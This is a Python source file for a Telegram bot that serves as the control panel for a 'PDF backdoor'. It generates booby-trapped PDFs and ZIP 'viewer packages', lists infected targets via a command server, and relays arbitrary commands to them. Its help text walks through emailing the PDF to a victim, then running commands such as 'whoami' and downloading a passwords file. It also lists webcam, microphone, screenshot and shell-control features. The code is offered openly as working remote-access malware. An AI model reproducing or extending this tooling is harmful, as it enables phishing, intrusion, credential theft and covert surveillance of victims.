"""
Enhanced Telegram bot with PDF backdoor integration
"""
import telebot
import requests
import json
import os
from pdf_generator import PDFBackdoor
from config import config

# Initialize bot
bot = telebot.TeleBot(config.API_TOKEN)

# PDF backdoor instances
pdf_targets = {}
command_server_url = "localhost:8181"

@bot.message_handler(commands=['createpdf'])
def create_pdf_command(message):
    """Create a malicious PDF"""
    try:
        # Parse command arguments
        args = message.text.split(' ', 2)
        if len(args) < 2:
            bot.send_message(message.chat.id, "Usage: /createpdf <title> [server_url]")
            return
        
        title = args[1]
        server_url = args[2] if len(args) > 2 else ""
        
        # Create PDF backdoor
        pdf_backdoor = PDFBackdoor(
            bot_token=config.API_TOKEN,
            chat_id=message.chat.id,
            server_url=server_url
        )
        
        # Generate PDF
        pdf_path = f"/tmp/{title.replace(' ', '_')}.pdf"
        pdf_backdoor.create_pdf_with_payload(pdf_path, title)
        
        # Send PDF to user
        with open(pdf_path, 'rb') as pdf_file:
            bot.send_document(
                message.chat.id, 
                pdf_file,
                caption=f"📄 PDF created: {title}\n\n⚠️ When opened, this will notify you and establish connection."
            )
        
        # Clean up
        os.remove(pdf_path)
        
    except Exception as e:
        bot.send_message(message.chat.id, f"Error creating PDF: {e}")

@bot.message_handler(commands=['createzip'])
def create_zip_command(message):
    """Create PDF with ZIP payload"""
    try:
        args = message.text.split(' ', 1)
        title = args[1] if len(args) > 1 else "Important Document"
        
        pdf_backdoor = PDFBackdoor(
            bot_token=config.API_TOKEN,
            chat_id=message.chat.id,
            server_url=command_server_url
        )
        
        pdf_path = f"/tmp/{title.replace(' ', '_')}.pdf"
        pdf_path, zip_path = pdf_backdoor.create_executable_pdf(pdf_path, title)
        
        # Send both files
        with open(pdf_path, 'rb') as pdf_file:
            bot.send_document(message.chat.id, pdf_file, caption="📄 PDF Document")
        
        with open(zip_path, 'rb') as zip_file:
            bot.send_document(message.chat.id, zip_file, caption="📦 Document Viewer Package")
        
        # Clean up
        os.remove(pdf_path)
        os.remove(zip_path)
        
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['targets'])
def list_targets_command(message):
    """List active PDF targets"""
    try:
        response = requests.get(f"{command_server_url}/targets")
        if response.status_code == 200:
            targets = response.json()
            
            if not targets:
                bot.send_message(message.chat.id, "No active targets")
                return
            
            target_list = "🎯 **Active Targets:**\n\n"
            for target_id, info in targets.items():
                target_list += f"**ID:** `{target_id}`\n"
                target_list += f"**Info:** {info.get('info', 'N/A')}\n"
                target_list += f"**Last Seen:** {info.get('last_seen', 'N/A')}\n\n"
            
            bot.send_message(message.chat.id, target_list, parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "Error connecting to command server")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['sendcmd'])
def send_command_to_target(message):
    """Send command to specific target"""
    try:
        args = message.text.split(' ', 2)
        if len(args) < 3:
            bot.send_message(message.chat.id, "Usage: /sendcmd <target_id> <command>")
            return
        
        target_id = args[1]
        command = args[2]
        
        data = {
            'target_id': target_id,
            'command': command
        }
        
        response = requests.post(f"{command_server_url}/send_command", json=data)
        
        if response.status_code == 200:
            bot.send_message(message.chat.id, f"✅ Command sent to target `{target_id}`")
        else:
            bot.send_message(message.chat.id, f"❌ Failed to send command")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

# Add to existing help text
ENHANCED_HELP = """
## **🎯 PDF Backdoor Commands**
- `/createpdf <title>` - Create malicious PDF
- `/createzip <title>` - Create PDF with ZIP payload  
- `/targets` - List active PDF targets
- `/sendcmd <target_id> <command>` - Send command to target

## **PDF Usage:**
1. Create PDF with `/createpdf "Meeting Notes"`
2. Send PDF to target via email/messaging
3. When opened, you'll get notification
4. Use `/targets` to see active connections
5. Send commands with `/sendcmd`

**Example:**
- `/createpdf "Quarterly Report"`
- `/sendcmd target123 "whoami"`
- `/sendcmd target123 "download:C:\\Users\\user\\Documents\\passwords.txt"`
"""

@bot.message_handler(commands=['help'])
def enhanced_help_command(message):
    """Show enhanced help with PDF commands"""
    original_help = """
🤖 **Ubuntu VPS Remote Control Bot**

## **🛠️ System Commands**
- `/start` - Start and authenticate
- `/help` - Show this help
- `/sysinfo` - Show system information  
- `/netinfo` - Show network information
- `/processes` - List running processes
- `/killprocess <name/pid>` - Kill a process
- `/shutdown` - Shutdown system
- `/restart` - Restart system
- `/suspend` - Suspend system

## **📁 File Operations**
- `/download <filepath>` - Download a file
- `/upload` - Upload a file
- `/metadata <filepath>` - Show file metadata
- `/run <filepath>` - Execute a file

## **📷 Media Capture**
- `/screenshot` - Take a screenshot
- `/mic [seconds]` - Record audio (default 5s)
- `/webcam` - Take webcam photo

## **⚙️ Command Execution**
- `/e <command>` - Execute single command
- `/shell` - Start interactive shell session
"""
    
    full_help = original_help + ENHANCED_HELP
    bot.send_message(message.chat.id, full_help, parse_mode='Markdown')

if __name__ == "__main__":
    print("Enhanced Telegram Bot with PDF Backdoor starting...")
    print("Make sure to:")
    print("1. Install: pip install reportlab flask")
    print("2. Update command_server_url in this file")
    print("3. Run pdf_server.py on your server")
    print("4. Configure your bot token")
    
    bot.polling(none_stop=True)

